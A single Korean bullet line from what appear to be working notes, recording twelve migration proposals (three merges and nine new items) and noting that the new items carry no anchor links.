- 이관 제안 총 12건(병합 3 + 신규 9) — 신규 항목은 노트에 앵커 링크 걸지 않음
